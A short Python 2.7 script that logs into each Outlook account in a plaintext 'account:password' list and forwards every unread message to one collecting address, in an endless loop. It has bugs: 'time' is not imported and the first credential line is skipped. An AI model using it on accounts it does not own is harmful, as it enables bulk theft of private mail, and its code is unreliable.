# pip install -r requirements.txt
# python2.7 forward.py
import outlook

main = str(open(r'main_email.txt', 'r').readline())
print("Forwarding emails to " + main + "...")
while True:
    emails = open(r'outlook_mails.txt', 'r')
    email = emails.readline()
    for email in emails:
        hotmail = email.rstrip('\n')
        hot = hotmail.split(":")
        account = str(hot[0])
        password = str(hot[1])
        mail = outlook.Outlook()
        mail.login(account,password)
        try:
            mail.inbox()
            try:
                mail.unread()
                sub = mail.mailsubject()
                bd = mail.mailbody()
                print('\033[1;32m   Found message with subject: ' + sub + '\n\033[1;37m   Forwarding to ' + main + '...')
                mail.sendEmail(main,sub,bd)
            except:
                print("\033[1;33m No unread emails")
        except:
            try:
                time.sleep(3)
                mail.inbox()
                try:
                    mail.unread()
                    sub = mail.mailsubject()
                    bd = mail.mailbody()
                    print('\033[1;32m   Found message with subject: ' + sub + '\n\033[1;37m   Forwarding to ' + main + '...')
                    mail.sendEmail(main,sub,bd)
                except:
                    print("\033[1;33m No unread emails")
            except:
                print("\033[0;31m Error: Could not find inbox, Login manually to " + account + " and retry.")
